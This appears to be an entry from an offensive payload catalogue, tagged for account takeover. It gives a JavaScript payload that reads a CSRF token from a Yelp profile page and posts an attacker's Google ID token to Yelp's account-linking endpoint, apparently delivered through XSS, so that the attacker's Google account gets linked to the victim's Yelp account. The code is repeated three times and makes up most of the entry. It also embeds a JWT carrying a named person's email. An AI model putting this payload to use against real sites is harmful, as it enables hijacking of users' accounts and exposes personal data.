---
data: >-
  (function f(){ a =new XMLHttpRequest(); a.addEventListener('load',function(){
  rx =/"GoogleConnect": "([^"]*)"/; id_token
  ="eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
  b = rx.exec(this.responseText);
  fetch("https://www.yelp.dk/google_connect/register",{"method":"POST","body":new
  URLSearchParams({"id_token": id_token,"csrftok": b[1]})}) });
  a.open('GET','https://www.yelp.dk/profile_sharing'); a.send(); })();
tags:
  - ato
  - javascript
type: command
executor: javascript
platforms:
  - Web
id: 49444be6-1bd2-46dd-a509-786a13d9c376
created_at: '2025-12-13T23:56:20.345Z'
updated_at: '2025-12-13T23:56:20.345Z'
verified: false
validated: true
submitted: true
---
# javascript-ato-payload

## Command

```javascript
(function f(){ a =new XMLHttpRequest(); a.addEventListener('load',function(){ rx =/"GoogleConnect": "([^"]*)"/; id_token ="eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg"; b = rx.exec(this.responseText); fetch("https://www.yelp.dk/google_connect/register",{"method":"POST","body":new URLSearchParams({"id_token": id_token,"csrftok": b[1]})}) }); a.open('GET','https://www.yelp.dk/profile_sharing'); a.send(); })();
```

## Description

JavaScript payload for Google account linking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id_token` | JWT for attacker's Google account | Yes |

## Examples

### Basic Usage

```javascript
(function f(){ a =new XMLHttpRequest(); a.addEventListener('load',function(){ rx =/"GoogleConnect": "([^"]*)"/; id_token ="eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg"; b = rx.exec(this.responseText); fetch("https://www.yelp.dk/google_connect/register",{"method":"POST","body":new URLSearchParams({"id_token": id_token,"csrftok": b[1]})}) }); a.open('GET','https://www.yelp.dk/profile_sharing'); a.send(); })();
```

## Expected Output

Links attacker's Google to victim's Yelp

## Related

- [[procedures/Perform-Account-Takeover-via-Google-Linking-XSS]]
